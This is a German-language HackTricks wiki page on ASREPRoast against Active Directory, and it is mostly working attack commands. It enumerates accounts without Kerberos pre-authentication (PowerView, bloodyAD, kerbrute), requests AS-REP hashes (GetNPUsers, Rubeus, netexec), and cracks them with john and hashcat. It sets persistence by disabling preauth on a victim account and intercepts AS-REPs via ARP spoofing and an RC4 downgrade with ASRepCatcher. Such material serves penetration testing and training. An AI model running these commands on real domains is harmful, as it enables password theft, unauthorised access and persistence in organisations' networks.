# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, die das **Kerberos pre-authentication required attribute** nicht besitzen. Im Wesentlichen erlaubt diese Schwachstelle Angreifern, eine Authentifizierungsanforderung für einen Benutzer an den Domain Controller (DC) zu senden, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Benutzerpasswort abgeleiteten Schlüssel verschlüsselt ist; Angreifer können diese Nachricht offline knacken, um das Benutzerpasswort zu ermitteln.

Die Hauptvoraussetzungen für diesen Angriff sind:

- **Lack of Kerberos pre-authentication**: Zielbenutzer dürfen diese Sicherheitsfunktion nicht aktiviert haben.
- **Connection to the Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optional domain account**: Ein Domain-Account ermöglicht Angreifern, anfällige Benutzer über LDAP-Abfragen effizienter zu identifizieren. Ohne einen solchen Account müssen Angreifer Benutzernamen erraten.

#### Auflisten verwundbarer Benutzer (erfordert Domain-Anmeldeinformationen)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP-Nachricht anfordern
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting mit Rubeus erzeugt ein 4768-Ereignis mit einem Verschlüsselungstyp von 0x17 und einem Preauth-Typ von 0.

#### Kurze One-Liner (Linux)

- Zuerst potenzielle Ziele ermitteln (z. B. aus leaked build paths) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Den AS-REP eines einzelnen Benutzers sogar mit einem **leeren** Passwort abrufen mit `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec gibt außerdem die LDAP signing/channel binding posture aus).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – es erkennt automatisch **-m 18200** (etype 23) für AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Setze **preauth** auf 'not required' für einen Benutzer, für den Sie **GenericAll**-Berechtigungen haben (oder Berechtigungen zum Schreiben von Eigenschaften):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast ohne Anmeldeinformationen

Ein Angreifer kann eine man-in-the-middle-Position nutzen, um AS-REP packets abzufangen, während sie das Netzwerk durchlaufen, ohne darauf angewiesen zu sein, dass Kerberos pre-authentication deaktiviert ist. Daher funktioniert es für alle Benutzer im VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht dies. Außerdem zwingt das Tool Client-Workstations dazu, RC4 zu verwenden, indem es die Kerberos-Aushandlung verändert.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
